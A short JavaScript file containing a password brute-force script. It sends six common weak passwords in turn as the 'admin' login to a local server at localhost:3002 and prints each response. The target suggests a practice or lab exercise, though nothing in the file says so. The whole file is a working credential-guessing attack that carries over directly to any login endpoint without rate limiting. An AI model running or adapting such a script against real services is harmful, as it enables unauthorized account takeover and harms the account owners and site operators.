const passwords = [
    "123",
    "admin",
    "password",
    "12345",
    "123456",
    "qwerty"
];


async function bruteForce() {

    for (const password of passwords) {

        const response = await fetch(
            "http://localhost:3002/login",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    username: "admin",
                    password: password
                })
            }
        );


        const data = await response.json();


        console.log(
            `Trying ${password} -> ${data.message}`
        );

    }

}


bruteForce();